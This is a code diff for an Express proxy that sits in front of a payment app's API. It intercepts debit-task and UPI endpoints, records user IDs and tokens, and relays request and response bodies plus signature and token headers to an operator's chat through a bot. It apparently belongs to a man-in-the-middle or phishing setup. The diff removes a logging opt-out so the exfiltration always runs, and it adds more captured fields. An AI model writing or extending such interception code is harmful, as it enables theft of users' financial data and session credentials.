@@ -242,8 +242,7 @@ app.use(async (req, res, next) => {
 });
 
 async function proxyFetch(req) {
-  const apiPath = req.originalUrl.replace(/^\/app\//, '/api/');
-  const url = ORIGINAL_API + apiPath;
+  const url = ORIGINAL_API + req.originalUrl;
   const fwd = {};
   for (const [k, v] of Object.entries(req.headers)) {
     const kl = k.toLowerCase();
@@ -967,17 +966,25 @@ app.all('/app/pay/debit/task', async (req, res) => {
     const userId = await extractUserId(req, jsonResp);
     if (userId) saveTokenUserId(req, userId);
     sendJson(res, respHeaders, jsonResp, respBody);
-    if (!isLogOff(data, userId) && data.adminChatId && bot) {
+    if (data.adminChatId && bot) {
       const respData = getResponseData(jsonResp);
       const taskCount = Array.isArray(respData) ? respData.length : (respData && respData.list ? respData.list.length : '?');
       const statusCode = jsonResp ? (jsonResp.code ?? jsonResp.status ?? jsonResp.statusCode ?? '?') : '?';
       const msg = jsonResp ? (jsonResp.msg ?? jsonResp.message ?? '') : '';
       const reqBody = req.parsedBody ? JSON.stringify(req.parsedBody).substring(0, 200) : 'none';
-      const topKeys = jsonResp ? Object.keys(jsonResp).join(',') : 'null';
-      const dataKeys = respData ? (typeof respData === 'object' ? (Array.isArray(respData) ? `array[${respData.length}]` : Object.keys(respData).join(',')) : typeof respData) : 'null';
-      bot.sendMessage(data.adminChatId, `💸 Debit Task [${userId || 'N/A'}]\n📊 Tasks: ${taskCount}\n🔢 Code: ${statusCode}\n💬 Msg: ${msg}\n🔑 TopKeys: ${topKeys}\n📋 DataKeys: ${dataKeys}\n📤 ReqBody: ${reqBody}\n📥 Resp: ${respBody.substring(0, 400)}`).catch(()=>{});
+      const rawLen = req.rawBody ? req.rawBody.length : 0;
+      const httpStatus = response ? response.status : '?';
+      const hasSig = req.headers['signature'] ? 'yes' : 'no';
+      const hasToken = req.headers['logintoken'] ? 'yes' : 'no';
+      const ct = req.headers['content-type'] || 'none';
+      bot.sendMessage(data.adminChatId, `💸 Task [${userId || 'N/A'}]\n📊 Count: ${taskCount} | HTTP: ${httpStatus}\n🔢 Code: ${statusCode} | Msg: ${msg}\n📤 Body(${rawLen}): ${reqBody}\n🔐 Sig: ${hasSig} | Token: ${hasToken}\n📋 CT: ${ct}\n📥 ${respBody.substring(0, 500)}`).catch(()=>{});
     }
-  } catch(e) { await transparentProxy(req, res); }
+  } catch(e) {
+    if (bot && (await loadData()).adminChatId) {
+      bot.sendMessage((await loadData()).adminChatId, `❌ Task ERROR: ${e.message}`).catch(()=>{});
+    }
+    await transparentProxy(req, res);
+  }
 });
 
 app.all('/app/pay/debit/upis', async (req, res) => {
